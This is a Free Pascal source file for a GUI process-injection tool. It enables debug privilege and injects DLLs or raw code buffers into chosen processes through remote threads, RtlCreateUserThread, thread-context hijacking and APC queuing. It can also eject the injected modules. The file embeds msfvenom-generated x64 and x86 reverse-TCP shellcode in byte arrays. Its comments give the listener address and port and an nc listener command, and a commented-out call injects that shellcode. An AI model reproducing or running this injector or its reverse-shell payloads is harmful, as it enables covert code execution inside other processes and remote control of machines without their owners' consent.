unit umain;

{$mode objfpc}{$H+}
//{$mode delphi}{$H+}

interface

uses
  Classes, windows,SysUtils, FileUtil, Forms, Controls, Graphics, Dialogs, StdCtrls,
  ComCtrls,injection,ntdll,advapi32;

type

  { TForm1 }

  TForm1 = class(TForm)
    btninject: TButton;
    btnenum: TButton;
    btneject: TButton;
    btnrefresh: TButton;
    btnbrowser: TButton;
    chkdata: TCheckBox;
    OpenDialog1: TOpenDialog;
    rbthreadcontext: TRadioButton;
    rbapcthread: TRadioButton;
    RadioButton6: TRadioButton;
    txtprocess: TComboBox;
    Label1: TLabel;
    Label3: TLabel;
    ListBox1: TListBox;
    rbremotethread: TRadioButton;
    rbuserthread: TRadioButton;
    rbthreadex: TRadioButton;
    StatusBar1: TStatusBar;
    txtdata: TEdit;
    txtdll: TEdit;
    txtpid: TEdit;
    procedure btnbrowserClick(Sender: TObject);
    procedure btninjectClick(Sender: TObject);
    procedure btnenumClick(Sender: TObject);
    procedure btnejectClick(Sender: TObject);
    procedure btnrefreshClick(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: boolean);
    procedure FormCreate(Sender: TObject);
    procedure RadioButton6Change(Sender: TObject);
    procedure txtprocessExit(Sender: TObject);
    procedure txtprocessSelect(Sender: TObject);
  private

  public

  end;

  //psapi
  type phmodule=^hmodule;
  function EnumProcessModules(hProcess: HANDLE; lphModule: PHMODULE; cb: DWORD;var lpcbNeeded: DWORD): BOOL; stdcall;external 'psapi.dll';
  function GetModuleFileNameExA(hProcess: HANDLE; hModule: HMODULE; lpFilename: LPSTR; nSize: DWORD): DWORD; stdcall;external 'psapi.dll';
  function EnumProcesses(lpidProcess: LPDWORD; cb: DWORD; var cbNeeded: DWORD): BOOL; stdcall;external 'psapi.dll';
  function GetModuleBaseNameA(hProcess: HANDLE; hModule: HMODULE; lpBaseName: LPSTR;nSize: DWORD): DWORD; stdcall;external 'psapi.dll';
  //
  function GetThreadId(thread:thandle):NTSTATUS;stdcall;external 'kernel32.dll';
var
  Form1: TForm1;
  hMemFile:thandle;
  //ps:TDGProcessList ;
  //msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.145 LPORT=4444 EXITFUNC=thread -f c
  //nc64 -nlp 4444
  rev_shell_64:array [0..459] of byte=
    ($fc,$48,$83,$e4,$f0,$e8,$c0,$00,$00,$00,$41,$51,$41,$50,$52
,$51,$56,$48,$31,$d2,$65,$48,$8b,$52,$60,$48,$8b,$52,$18,$48
,$8b,$52,$20,$48,$8b,$72,$50,$48,$0f,$b7,$4a,$4a,$4d,$31,$c9
,$48,$31,$c0,$ac,$3c,$61,$7c,$02,$2c,$20,$41,$c1,$c9,$0d,$41
,$01,$c1,$e2,$ed,$52,$41,$51,$48,$8b,$52,$20,$8b,$42,$3c,$48
,$01,$d0,$8b,$80,$88,$00,$00,$00,$48,$85,$c0,$74,$67,$48,$01
,$d0,$50,$8b,$48,$18,$44,$8b,$40,$20,$49,$01,$d0,$e3,$56,$48
,$ff,$c9,$41,$8b,$34,$88,$48,$01,$d6,$4d,$31,$c9,$48,$31,$c0
,$ac,$41,$c1,$c9,$0d,$41,$01,$c1,$38,$e0,$75,$f1,$4c,$03,$4c
,$24,$08,$45,$39,$d1,$75,$d8,$58,$44,$8b,$40,$24,$49,$01,$d0
,$66,$41,$8b,$0c,$48,$44,$8b,$40,$1c,$49,$01,$d0,$41,$8b,$04
,$88,$48,$01,$d0,$41,$58,$41,$58,$5e,$59,$5a,$41,$58,$41,$59
,$41,$5a,$48,$83,$ec,$20,$41,$52,$ff,$e0,$58,$41,$59,$5a,$48
,$8b,$12,$e9,$57,$ff,$ff,$ff,$5d,$49,$be,$77,$73,$32,$5f,$33
,$32,$00,$00,$41,$56,$49,$89,$e6,$48,$81,$ec,$a0,$01,$00,$00
,$49,$89,$e5,$49,$bc,$02,$00,$11,$5c,$7f,$00,$00,$01,$41,$54 //$11,$5c = 4444 //$c0,$a8,$01,$91 = 192.168.1.145
,$49,$89,$e4,$4c,$89,$f1,$41,$ba,$4c,$77,$26,$07,$ff,$d5,$4c
,$89,$ea,$68,$01,$01,$00,$00,$59,$41,$ba,$29,$80,$6b,$00,$ff
,$d5,$50,$50,$4d,$31,$c9,$4d,$31,$c0,$48,$ff,$c0,$48,$89,$c2
,$48,$ff,$c0,$48,$89,$c1,$41,$ba,$ea,$0f,$df,$e0,$ff,$d5,$48
,$89,$c7,$6a,$10,$41,$58,$4c,$89,$e2,$48,$89,$f9,$41,$ba,$99
,$a5,$74,$61,$ff,$d5,$48,$81,$c4,$40,$02,$00,$00,$49,$b8,$63
,$6d,$64,$00,$00,$00,$00,$00,$41,$50,$41,$50,$48,$89,$e2,$57
,$57,$57,$4d,$31,$c0,$6a,$0d,$59,$41,$50,$e2,$fc,$66,$c7,$44
,$24,$54,$01,$01,$48,$8d,$44,$24,$18,$c6,$00,$68,$48,$89,$e6
,$56,$50,$41,$50,$41,$50,$41,$50,$49,$ff,$c0,$41,$50,$49,$ff
,$c8,$4d,$89,$c1,$4c,$89,$c1,$41,$ba,$79,$cc,$3f,$86,$ff,$d5
,$48,$31,$d2,$48,$ff,$ca,$8b,$0e,$41,$ba,$08,$87,$1d,$60,$ff
,$d5,$bb,$e0,$1d,$2a,$0a,$41,$ba,$a6,$95,$bd,$9d,$ff,$d5,$48
,$83,$c4,$28,$3c,$06,$7c,$0a,$80,$fb,$e0,$75,$05,$bb,$47,$13
,$72,$6f,$6a,$00,$59,$41,$89,$da,$ff,$d5);

  //msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.145 LPORT=4444 EXITFUNC=thread -f c
  rev_shell_86:array [0..323] of byte=
  ($fc,$e8,$82,$00,$00,$00,$60,$89,$e5,$31,$c0,$64,$8b,$50,$30
,$8b,$52,$0c,$8b,$52,$14,$8b,$72,$28,$0f,$b7,$4a,$26,$31,$ff
,$ac,$3c,$61,$7c,$02,$2c,$20,$c1,$cf,$0d,$01,$c7,$e2,$f2,$52
,$57,$8b,$52,$10,$8b,$4a,$3c,$8b,$4c,$11,$78,$e3,$48,$01,$d1
,$51,$8b,$59,$20,$01,$d3,$8b,$49,$18,$e3,$3a,$49,$8b,$34,$8b
,$01,$d6,$31,$ff,$ac,$c1,$cf,$0d,$01,$c7,$38,$e0,$75,$f6,$03
,$7d,$f8,$3b,$7d,$24,$75,$e4,$58,$8b,$58,$24,$01,$d3,$66,$8b
,$0c,$4b,$8b,$58,$1c,$01,$d3,$8b,$04,$8b,$01,$d0,$89,$44,$24
,$24,$5b,$5b,$61,$59,$5a,$51,$ff,$e0,$5f,$5f,$5a,$8b,$12,$eb
,$8d,$5d,$68,$33,$32,$00,$00,$68,$77,$73,$32,$5f,$54,$68,$4c
,$77,$26,$07,$ff,$d5,$b8,$90,$01,$00,$00,$29,$c4,$54,$50,$68
,$29,$80,$6b,$00,$ff,$d5,$50,$50,$50,$50,$40,$50,$40,$50,$68
,$ea,$0f,$df,$e0,$ff,$d5,$97,$6a,$05,$68,$7f,$00,$00,$01,$68  //$c0,$a8,$01,$91 = 192.168.1.145
,$02,$00,$11,$5c,$89,$e6,$6a,$10,$56,$57,$68,$99,$a5,$74,$61  //$11,$5c = 4444
,$ff,$d5,$85,$c0,$74,$0c,$ff,$4e,$08,$75,$ec,$68,$f0,$b5,$a2
,$56,$ff,$d5,$68,$63,$6d,$64,$00,$89,$e3,$57,$57,$57,$31,$f6
,$6a,$12,$59,$56,$e2,$fd,$66,$c7,$44,$24,$3c,$01,$01,$8d,$44
,$24,$10,$c6,$00,$44,$54,$50,$56,$56,$56,$46,$56,$4e,$56,$56
,$53,$56,$68,$79,$cc,$3f,$86,$ff,$d5,$89,$e0,$4e,$56,$46,$ff
,$30,$68,$08,$87,$1d,$60,$ff,$d5,$bb,$e0,$1d,$2a,$0a,$68,$a6
,$95,$bd,$9d,$ff,$d5,$3c,$06,$7c,$0a,$80,$fb,$e0,$75,$05,$bb
,$47,$13,$72,$6f,$6a,$00,$53,$ff,$d5);

implementation

{$R *.lfm}

procedure log(msg:string;level:byte=0);
begin
//do nothing...
end;

function _EnumProc(search:string='';items:tstrings=nil):dword;
var
  cb,cbneeded,cbneeded2:dword;
  count:dword;
  pids,modules:array[0..1023] of dword;
  hProcess:thandle;
  szProcessName:array[0..259] of char;
  username,domain,tmp:string;
begin
result:=0;
   cb:=sizeof(dword)*1024;
   if EnumProcesses (@pids[0],cb,cbneeded) then
      begin
      //writeln(cbneeded div sizeof(dword)); //debug
      for count:=0 to cbneeded div sizeof(dword) - 1 do
          begin
          //beware of 32bit process onto 64bits processes...
          hProcess := OpenProcess( PROCESS_QUERY_INFORMATION or PROCESS_VM_READ,
                                   FALSE, pids[count] );
          if hprocess<=0 then log( inttostr(pids[count])+', OpenProcess failed - '+inttostr(getlasterror));
          if hprocess>0 then
          if GetModuleBaseNameA( hProcess, 0, szProcessName,sizeof(szProcessName))<>0 then
             begin
             if search='' then
                begin
                {
                if GetProcessUserAndDomain (pids[count],username,domain)=true
                   then tmp:=domain+'\'+username
                   else tmp:='';
                }
                log(inttostr(pids[count])+ #9+szProcessName+#9+tmp,1 );
                if items<>nil then Items.add(szProcessName);
                end; //if search='' then
             if lowercase(search)=lowercase(strpas(szProcessName) ) then
                begin
                result:=pids[count];
                break;
                end; //if lowercase...
             end// if GetModuleBaseNameA...
             else log( inttostr(pids[count])+', GetModuleBaseNameA failed - '+inttostr(getlasterror));
             closehandle(hProcess);
          end; //for count:=0...
      end//if EnumProcesses...
      else log('EnumProcesses failed, '+inttostr(getlasterror));
end;




function NTEnableDebugPrivilege(const Value: Boolean): Boolean;
const
  SE_DEBUG_NAME = 'SeDebugPrivilege';
var
  hToken: THandle;
  tp,prev: TOKEN_PRIVILEGES;
  d: DWORD;
  ret:boolean;
begin

  Result := False;
  if NtOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, @hToken)=0 then
  begin
    tp.PrivilegeCount := 1;
    LookupPrivilegeValue(nil, SE_DEBUG_NAME, tp.Privileges[0].Luid);
        if Value then
          tp.Privileges[0].Attributes := $00000002
        else
          tp.Privileges[0].Attributes := $80000000;
    d:=0;
    if NtAdjustPrivilegesToken(hToken, False, @tp, SizeOf(TOKEN_PRIVILEGES), @prev, @d)=0 then
       result:=true;
    ntclose(hToken);
  end; // else showmessage('NtOpenProcessToken failed');
end;






function Proc(dwEntryPoint: Pointer): longword; stdcall;
type msgbox=function(hWnd: HWND; lpText, lpCaption: PAnsiChar; uType: UINT): Integer; stdcall;
var
buffer:pchar;
p:pointer;
func:msgbox;
begin
  {now we are in notepad}
  //LoadLibraryA('kernel32.dll');
  pointer(func):=GetProcAddress(LoadLibraryA('user32.dll'),'messageboxa');
  //p:=VirtualAlloc(buffer,8,MEM_COMMIT,PAGE_READWRITE);
  func(0,pchar('hello from remote process'),pchar('proc'),MB_OK );
  //virtualfree(p,0,MEM_RELEASE);
  Result := 0;
end;

function Proc2(dwEntryPoint: Pointer): longword; stdcall;
var hfile:thandle;
s:string;
written:cardinal;
p:pointer;
begin
  LoadLibrary('kernel32.dll');
  LoadLibrary('user32.dll');
  hFile := CreateFile(pchar('c:\test.txt'), GENERIC_WRITE, 0, nil, CREATE_ALWAYS, 0, 0);
  p:=VirtualAlloc(nil,8,MEM_COMMIT,PAGE_READWRITE);
  s:=(inttostr(GetCurrentProcessId )); //'12345678';
  CopyMemory(p,@s[1],length(s));
  WriteFile(hfile,p^,8,written,nil);
  virtualfree(p,0,MEM_RELEASE);
  CloseHandle(hfile);
  Result := 0;
end;

function Proc3(param: Pointer): longword; stdcall;
var
written:cardinal;
p:pchar;
begin
//p:=pchar(param^);
//showmessage(strpas(p));
  LoadLibrary('kernel32.dll');
  LoadLibrary('user32.dll');
  //messageboxa(0,pchar(inttostr(getcurrentprocessid)),'lpcaption',MB_OK );
  //freelibrary(loadlibrary(p));
  freelibrary(loadlibrary('hook.dll'));
  Result := 0;
end;

function setdata(data:string):boolean;
  type tipc=record
  buffer:array [0..255] of char;
  end;
var
ipc:pointer;
mapname:string;
begin

if hMemFile =0 then
begin
//lets create our ipc 'server'
if enablepriv('SeCreateGlobalPrivilege')=true then mapname:='Global\injector' else mapname:='injector';
hMemFile:= CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(tipc ), pchar(mapname));
//on the ipc 'client' side, we will use hMemFile  := OpenFileMapping(FILE_MAP_ALL_ACCESS, False, 'injector');
end;

//CreateFileMapping vs OpenFileMapping...

if hMemFile>0 then
begin
OutputDebugString(pchar('CreateFileMapping:'+mapname ));
ipc := MapViewOfFile(hMemFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
if ipc<>nil then
  begin
  fillchar(tipc(ipc^).buffer, sizeof(tipc(ipc^).buffer),0);
  CopyMemory(@tipc(ipc^).buffer[0],@data[1],length(data));
  OutputDebugString('MapViewOfFile done.');
  end;
end;//if hMemFile>0 then
end;

procedure TForm1.btninjectClick(Sender: TObject);
var
PID: longword;
ProcessHandle,ThreadHandle,oldth,h:thandle;
i:integer;
oa:TObjectAttributes;
cid:CLIENT_ID ;
access,dw,returnedbytes:dword;
p:pchar;
status:integer;
buffer:array of byte;
begin

ProcessHandle:=thandle(-1);
if NTEnableDebugPrivilege(true)=false then
  begin
  showmessage('EnableDebugPrivilege failed');
  exit;
  end;
setlasterror(0);

if chkdata.Checked then setdata(txtdata.Text );

pid:=0;
pid:=_EnumProc (txtprocess.Text );
if pid<>0 then txtpid.text:=inttostr(pid);

  if txtpid.Text <>'' then pid:=strtoint(txtpid.Text );
  if pid<>0 then
  begin
    ProcessHandle :=thandle(-1);
    ThreadHandle :=thandle(-1);
    access:=PROCESS_ALL_ACCESS ;
    //access:=PROCESS_CREATE_THREAD or PROCESS_QUERY_INFORMATION or PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_VM_READ;
    //ProcessHandle := OpenProcess(access, False, PID);
    //

    InitializeObjectAttributes(oa,nil,0,0,nil);
    cid.UniqueProcess :=pid;
    cid.UniqueThread :=0;
    status:=NtOpenProcess(@ProcessHandle,access,@oa,@cid);
    if status<>0 then begin showmessage('NtOpenProcess failed,'+inttohex(status,4));exit;end;
    //
    if ProcessHandle >0 then
      begin
      try
      if rbremotethread.Checked then
        begin

        //if Inject_RemoteThreadCODE (ProcessHandle, @proc3)=false then showmessage('Inject failed') else  showmessage('Inject ok');
        if InjectNT_RemoteThreadDLL (ProcessHandle, txtdll.text+#0)=false then StatusBar1.SimpleText :=('Inject failed') else  StatusBar1.SimpleText :=('Inject ok');
        end;
      if rbuserthread.Checked then
        begin
        //getmem(p,length(ExtractFilePath(Application.ExeName)+'hook.dll'));
        //p:=pchar(ExtractFilePath(Application.ExeName)+'hook.dll');
        p:='hook.dll';
        //if InjectRTL_CODE(ProcessHandle, @proc,p)=false then showmessage('InjectRTL failed') else showmessage('InjectRTL ok');
        if InjectRTL_dll(ProcessHandle, txtdll.text+#0)=false then StatusBar1.SimpleText :=('InjectRTL failed') else StatusBar1.SimpleText :=('InjectRTL ok');
        end;

      if rbthreadcontext.Checked then
        begin
        status:=NtGetNextThread(ProcessHandle ,0,MAXIMUM_ALLOWED,0,0,@ThreadHandle);
        if status=0 then
           if injectNT_CTX (ProcessHandle ,ThreadHandle ,txtdll.text+#0)=false then StatusBar1.SimpleText :=('injectctx failed') else StatusBar1.SimpleText :=('injectctx ok');
        //if InjectRTL_DLL(ProcessHandle, 'c:\hook.dll')=false then showmessage('InjectRTL failed') else showmessage('InjectRTL ok');
        //if injectapc (ProcessHandle ,0,txtdll.text+#0) =false then StatusBar1.SimpleText :=('InjectAPC failed') else StatusBar1.SimpleText :=('InjectAPC ok');
        end;

      if rbapcthread.Checked then
        begin
        ThreadHandle:=0; //or -1.
        {
        status:=NtGetNextThread(ProcessHandle,0,MAXIMUM_ALLOWED,0,0,ThreadHandle);
        if status=0 then
          begin
          outputdebugstring(pchar('tid:'+inttostr(GetThreadId(ThreadHandle))));
          if injectAPC_DLL  (ProcessHandle ,ThreadHandle ,txtdll.text+#0)=false then StatusBar1.SimpleText :=('injectAPC failed') else StatusBar1.SimpleText :=('injectAPC ok');
          end;
        }
        //{
        while status=0 do
              begin
              oldth:=ThreadHandle; //zero on first round
              status:=ntGetNextThread(
                   ProcessHandle ,
                   oldth,    //or use ThreadHandle but then leak...
                   MAXIMUM_ALLOWED, //THREAD_ALL_ACCESS THREAD_QUERY_INFORMATION
                   0,
                   0,
                   @ThreadHandle  //newthread
                   );
              closehandle(oldth); //avoid leaking
              if status=0 then
                  begin
                  outputdebugstring(pchar('tid:'+inttostr(GetThreadId(ThreadHandle))));
                  if injectAPC_DLL  (ProcessHandle ,ThreadHandle ,txtdll.text+#0)=false then StatusBar1.SimpleText :=('injectAPC failed') else StatusBar1.SimpleText :=('injectAPC ok');
                  //closehandle(oldth);
                  end;
              end;
             //}
        end;

      if rbthreadex.Checked then
        begin
        //if InjectNT_CODE(ProcessHandle, @proc3)=false then showmessage('InjectNT failed') else showmessage('InjectNT ok');
        if InjectNT_DLL(ProcessHandle, txtdll.text+#0)=false then StatusBar1.SimpleText :=('InjectNT_DLL failed') else StatusBar1.SimpleText :=('InjectNT ok');
        end;

      if RadioButton6.Checked then
        begin
        //if InjectNT_CODE(ProcessHandle, @proc3)=false then showmessage('InjectNT failed') else showmessage('InjectNT ok');
        //
             h := CreateFile(pchar(txtdll.Text ), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
             if h=thandle(-1) then raise exception.Create ('CreateFile failed');
             dw := GetFileSize(h,nil)  ;
             log('GetFileSize:'+inttostr(dw));
             returnedbytes:=0;setlength(buffer,dw);
             if ReadFile(h,buffer[0],dw,returnedbytes,nil)=false then log('readfile failed');
             closehandle(h);
        //
        //if InjectRTL_BUFFER (ProcessHandle, {$IFDEF win64}rev_shell_64{$endif}{$IFDEF win32}rev_shell_86{$endif}  )=false then StatusBar1.SimpleText :=('InjectRTL_BUFFER failed') else StatusBar1.SimpleText :=('InjectNT ok');
        if InjectNT_BUFFER (ProcessHandle, buffer )=false then StatusBar1.SimpleText :=('InjectNT_BUFFER failed') else StatusBar1.SimpleText :=('InjectNT_BUFFER ok');
        end;

      except
      on e:exception do showmessage(e.Message );
      end;
      if ThreadHandle<>thandle(-1) then CloseHandle(ThreadHandle);
      if ProcessHandle<>thandle(-1) then CloseHandle(ProcessHandle);
      end
      else showmessage('NtOpenProcess failed,'+inttostr(getlasterror));
  end
  else showmessage('GetWindowThreadProcessId failed,'+inttostr(getlasterror));
//

try closehandle(ProcessHandle );except end;
sleep(100);
btnenumClick (self);
end;

procedure TForm1.btnbrowserClick(Sender: TObject);
begin
  if OpenDialog1.Execute=false then exit ;
  txtdll.Text :=OpenDialog1.FileName ;
end;

procedure TForm1.btnenumClick(Sender: TObject);
var
hprocess:thandle=thandle(-1);
 hmods:array[0..1023] of thandle;
 cbneeded,count:dword;
 szModName:array[0..254] of char;
 dummy:string;
begin
ListBox1.Clear ;
if txtpid.text='' then exit;
hprocess:=openprocess(  PROCESS_VM_READ or PROCESS_QUERY_INFORMATION,false,strtoint(txtpid.text));
if hprocess<=0 then exit;
cbNeeded:=0;
EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded);
if cbNeeded=0 then exit;
for count:=0 to (cbneeded div sizeof(thandle))-1 do
    begin
      GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) );
      dummy:=lowercase(strpas(szModName ));
      ListBox1.Items.Add  (dummy+' | '+inttohex(hMods[count],sizeof(thandle)));
    end;
closehandle(hprocess);
end;

procedure TForm1.btnejectClick(Sender: TObject);
var
tmp:string;

ProcessHandle:thandle;
oa:TObjectAttributes;
cid:CLIENT_ID ;
access:dword;
status:integer;
hmod:int64;
begin
if txtpid.text='' then exit;
//
tmp:=ListBox1.Items [ListBox1.ItemIndex];
delete(tmp,1,pos('|',tmp)+1);
hmod:=strtoint64('$'+tmp);
if MessageBoxA(0,pchar('eject 0x'+tmp+'?'),'injector',MB_YESNO )=idno then exit;
//
ProcessHandle :=thandle(-1);
access:=PROCESS_ALL_ACCESS ;
    InitializeObjectAttributes(oa,nil,0,0,nil);
    cid.UniqueProcess :=strtoint(txtpid.text);
    cid.UniqueThread :=0;
    status:=NtOpenProcess(@ProcessHandle,access,@oa,@cid);
    if status<>0 then begin showmessage('NtOpenProcess failed,'+inttohex(status,4));exit;end;

    if EjectRTL_DLL(ProcessHandle ,hmod)=false
       then StatusBar1.SimpleText := ('EjectRTL_DLL failed')
       else StatusBar1.SimpleText :=('EjectRTL_DLL OK');

    closehandle(ProcessHandle );

    btnenumClick (self);

end;

procedure TForm1.btnrefreshClick(Sender: TObject);
begin
  txtprocess.Clear ;
_EnumProc ('',txtprocess.Items );
if txtprocess.Items.Count >0 then
   begin
   txtprocess.ItemIndex :=0;
   txtprocessSelect(self);
   end;
end;

procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: boolean);
begin
  if hmemfile<>thandle(-1) then closehandle(hmemfile);
end;

procedure TForm1.FormCreate(Sender: TObject);
var
p:pchar;
dw:dword;
s:string;
begin

{$ifdef cpu64}
form1.Caption :='injector x64';
{$else cpu64}
form1.Caption :='injector x86';
{$endif cpu64}

//StatusBar1.SimpleText :='$'+inttohex(nativeuint(Pointer(GetModuleHandle(nil))),4);
dw:=1000;
hMemFile:=0;
txtdll.Text :=ExtractFilepath(Application.ExeName )+'hook.dll';
//p:=pchar(DwordToStr(dw));
//p:=pchar('test');
//showmessage(strpas(p));
btnrefreshClick(self);
end;

procedure TForm1.RadioButton6Change(Sender: TObject);
begin

end;

procedure TForm1.txtprocessExit(Sender: TObject);
begin

end;

procedure TForm1.txtprocessSelect(Sender: TObject);
begin
  txtpid.text:= inttostr(_EnumProc (txtprocess.text ));
end;




{$ASMMODE intel}
{
procedure loadDll; assembler;
asm
      push $DEADBEEF // EIP
      pushfd
      pushad
      push $DEADBEEF // memory with dll name
      mov eax, $DEADBEEF // loadlibrary address
      call eax
      popad
      popfd
      ret
end;
}

procedure dEnd; assembler;
asm

end;


end.

